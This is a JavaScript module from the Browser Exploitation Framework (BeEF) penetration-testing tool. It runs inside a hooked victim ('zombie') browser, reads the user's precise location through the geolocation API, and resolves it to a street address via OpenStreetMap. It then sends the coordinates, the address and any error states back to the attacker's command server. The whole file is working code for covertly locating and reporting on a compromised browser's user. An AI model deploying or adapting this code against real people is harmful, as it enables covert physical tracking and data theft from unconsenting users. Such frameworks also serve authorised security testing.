//
// Copyright (c) 2006-2025 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - https://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

/**
 * Provides functionalities to use the geolocation API.
 * @namespace beef.geolocation
 */

beef.geolocation = {

    /**
     * Check if browser supports the geolocation API
     * @return {boolean}
     */
    isGeolocationEnabled: function(){
		return !!navigator.geolocation;
    },

    /** 
     * Given latitude/longitude retrieves exact street position of the zombie
     * @param command_url
     * @param command_id
     * @param latitude
     * @param longitude
     */
    getOpenStreetMapAddress: function(command_url, command_id, latitude, longitude){

        // fixes damned issues with jquery 1.5, like this one:
        // http://bugs.jquery.com/ticket/8084
        $j.ajaxSetup({
            jsonp: null,
            jsonpCallback: null
        });

        $j.ajax({
            error: function(xhr, status, error){
                beef.debug("[geolocation.js] openstreetmap error");
                beef.net.send(command_url, command_id, "latitude=" + latitude
                             + "&longitude=" + longitude
                             + "&osm=UNAVAILABLE"
                             + "&geoLocEnabled=True");
                },
            success: function(data, status, xhr){
                beef.debug("[geolocation.js] openstreetmap success");
                //var jsonResp = $j.parseJSON(data);

                beef.net.send(command_url, command_id, "latitude=" + latitude
                             + "&longitude=" + longitude
//                             + "&osm=" + encodeURI(jsonResp.display_name)
                              + "&osm=" + data.display_name
                             + "&geoLocEnabled=True");
                },
            type: "get",
	    dataType: "json",
            url: "https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=" +
                latitude + "&lon=" + longitude + "&zoom=18&addressdetails=1"
        });

    },

    /**
     * Retrieve latitude/longitude using the geolocation API
     * @param command_url
     * @param command_id
     */
    getGeolocation: function (command_url, command_id){

        if (!navigator.geolocation) {
	        beef.net.send(command_url, command_id, "latitude=NOT_ENABLED&longitude=NOT_ENABLED&geoLocEnabled=False");	
			return;
		}
        beef.debug("[geolocation.js] navigator.geolocation.getCurrentPosition");
        navigator.geolocation.getCurrentPosition( //note: this is an async call
			function(position){ // success
				var latitude = position.coords.latitude;
        		var longitude = position.coords.longitude;
                beef.debug("[geolocation.js] success getting position. latitude [%d], longitude [%d]", latitude, longitude);
                beef.geolocation.getOpenStreetMapAddress(command_url, command_id, latitude, longitude);

			}, function(error){ // failure
                    beef.debug("[geolocation.js] error [%d] getting position", error.code);
					switch(error.code) // Returns 0-3
					{
						case 0:
			            	beef.net.send(command_url, command_id, "latitude=UNKNOWN_ERROR&longitude=UNKNOWN_ERROR&geoLocEnabled=False");
							return;
						case 1:
		            		beef.net.send(command_url, command_id, "latitude=PERMISSION_DENIED&longitude=PERMISSION_DENIED&geoLocEnabled=False");
							return;
						case 2:
		            		beef.net.send(command_url, command_id, "latitude=POSITION_UNAVAILABLE&longitude=POSITION_UNAVAILABLE&geoLocEnabled=False");
							return;
						case 3:
					   		beef.net.send(command_url, command_id, "latitude=TIMEOUT&longitude=TIMEOUT&geoLocEnabled=False");
							return;
					}
            	beef.net.send(command_url, command_id, "latitude=UNKNOWN_ERROR&longitude=UNKNOWN_ERROR&geoLocEnabled=False");
			},
			{enableHighAccuracy:true, maximumAge:30000, timeout:27000}
		);
    }
}


beef.regCmp('beef.geolocation');
